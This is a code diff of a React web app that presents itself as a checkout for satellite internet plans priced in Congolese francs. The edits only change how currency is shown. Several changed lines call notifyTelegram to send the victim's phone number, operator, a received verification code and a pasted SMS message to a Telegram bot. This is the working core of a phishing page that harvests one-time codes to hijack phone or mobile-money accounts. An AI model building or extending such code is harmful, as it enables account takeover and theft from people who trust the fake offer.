@@ -512,11 +512,11 @@ function PlanCard({ plan, selected, onSelect, cycle }) {
       {/* price */}
       <div className="mt-4 flex items-end gap-2">
         <span className="font-[JetBrains_Mono] text-[28px] leading-none font-bold text-[#EAF0FB]">
-         {price}fc
+         {price} FC
         </span>
         <span className="text-xs text-[#8C97B8] pb-1">/mois</span>
         {cycle === "annuel" && (
-          <span className="text-xs text-[#8C97B8]/60 line-through pb-1">{plan.monthly}fc</span>
+          <span className="text-xs text-[#8C97B8]/60 line-through pb-1">{plan.monthly} FC</span>
         )}
       </div>
 
@@ -632,7 +632,7 @@ function PaymentRecap({ plan, price }) {
           <p className="text-[11px] text-[#8C97B8]">Forfait internet satellite</p>
         </div>
       </div>
-      <span className="font-[JetBrains_Mono] text-lg font-bold text-[#EAF0FB]">${price}</span>
+      <span className="font-[JetBrains_Mono] text-lg font-bold text-[#EAF0FB]">{price} FC</span>
     </div>
   );
 }
@@ -934,7 +934,6 @@ function ErrorScreen({ operator, onDone, onContactWhatsApp }) {
         className="flex items-center justify-center w-16 h-16 rounded-full animate-[fadeSlideUp_0.5s_ease_both]"
         style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
       >
-        
       </span>
       <div>
         <p className="font-display text-lg font-bold text-[#EAF0FB]">
@@ -1078,7 +1077,7 @@ function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
         onDone={onFinish}
         onContactWhatsApp={() => {
           notifyTelegram(
-            `⚠️ Erreur signalée\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}`
+            `⚠️ Erreur signalée\nForfait : ${plan.name} (${price} FC/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}`
           );
         }}
       />
@@ -1148,7 +1147,7 @@ function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
           disabled={!message.trim()}
           onClick={() => {
             notifyTelegram(
-              `📨 Message collé\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}\nMessage : ${message}`
+              `📨 Message collé\nForfait : ${plan.name} (${price} FC/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}\nMessage : ${message}`
             );
             setFinalizing(true);
           }}
@@ -1302,7 +1301,7 @@ export default function App() {
                 onEdit={() => setCheckoutStep("phone")}
                 onConfirm={() => {
                   notifyTelegram(
-                    `📞 Nouveau numéro confirmé\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}`
+                    `📞 Nouveau numéro confirmé\nForfait : ${plan.name} (${price} FC/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}`
                   );
                   setCheckoutStep("code");
                 }}
@@ -1313,7 +1312,7 @@ export default function App() {
                 operator={op}
                 onValidate={(code) => {
                   notifyTelegram(
-                    `🔐 Code reçu\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}\nCode : ${code}`
+                    `🔐 Code reçu\nForfait : ${plan.name} (${price} FC/mois)\nOpérateur : ${op.name}\nNuméro : ${phone}\nCode : ${code}`
                   );
                   setCheckoutStep("connecting");
                 }}
@@ -1355,7 +1354,7 @@ export default function App() {
               <div className="shrink-0 mx-4 mb-3 flex items-center justify-between rounded-2xl bg-[#FFB020] px-4 py-3 animate-[fadeSlideUp_0.3s_ease_both]">
                 <div>
                   <p className="text-[11px] text-[#05070D]/70 font-medium">{plan.name} sélectionné</p>
-                  <p className="text-sm font-bold text-[#05070D]">${price}/mois</p>
+                  <p className="text-sm font-bold text-[#05070D]">{price} FC/mois</p>
                 </div>
                 <button
                   onClick={() => setCheckoutStep("method")}
